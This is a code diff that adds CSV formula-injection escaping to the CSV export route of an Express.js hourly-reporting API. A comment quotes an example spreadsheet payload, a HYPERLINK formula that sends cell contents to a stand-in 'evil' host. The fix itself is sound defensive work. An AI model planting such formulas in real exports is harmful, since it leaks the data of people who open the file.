@@ -11,6 +11,28 @@ const router = express.Router();
 // All routes require authentication
 router.use(authenticateUser);
 
+// Spreadsheet applications treat a cell beginning with =, +, -, @, tab or CR as a formula.
+// Stored values such as `=HYPERLINK("http://evil/?"&A1)` would execute when the exported
+// report is opened, so neutralise them by prefixing with a single quote (CWE-1236).
+const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
+function escapeCsvInjection(value) {
+  if (typeof value !== 'string') {
+    return value;
+  }
+  return CSV_FORMULA_PREFIX.test(value) ? `'${value}` : value;
+}
+
+function sanitizeCsvRecords(records) {
+  return records.map((record) => {
+    const safe = {};
+    for (const [key, value] of Object.entries(record)) {
+      safe[key] = escapeCsvInjection(value);
+    }
+    return safe;
+  });
+}
+
 // Get hourly report for specific client
 router.get('/client/:clientId', (req, res) => {
   const clientId = parseInt(req.params.clientId);
@@ -121,7 +143,7 @@ router.get('/export/csv/:clientId', (req, res) => {
             ]
           });
           
-          csvWriter.writeRecords(workEntries)
+          csvWriter.writeRecords(sanitizeCsvRecords(workEntries))
             .then(() => {
               // Send file and clean up
               res.download(tempPath, filename, (err) => {
